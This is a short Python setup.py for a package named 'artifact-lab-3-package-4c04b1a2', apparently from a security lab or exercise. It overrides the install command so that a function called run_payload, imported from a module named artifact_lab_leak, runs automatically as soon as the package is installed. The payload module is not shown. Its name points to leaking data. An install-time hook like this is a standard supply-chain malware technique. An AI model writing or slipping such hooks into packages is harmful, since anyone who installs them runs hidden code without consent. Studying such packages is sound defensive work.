import setuptools
from setuptools.command.install import install
from artifact_lab_leak import run_payload  # Import the payload function

# Custom install class to run the payload when the package is installed
class CustomInstallCommand(install):
    def run(self):
        install.run(self)  # Run the standard installation
        run_payload()      # Execute the payload right after installation

# Setup function
setuptools.setup(
    name="artifact-lab-3-package-4c04b1a2",
    version="1.0.4",  # Increment version number
    py_modules=["artifact_lab_leak"],  # Include the artifact_lab_leak.py module
    cmdclass={
        'install': CustomInstallCommand,  # Use the custom installation command
    },
    python_requires=">=3.6",  # Python version requirement
)
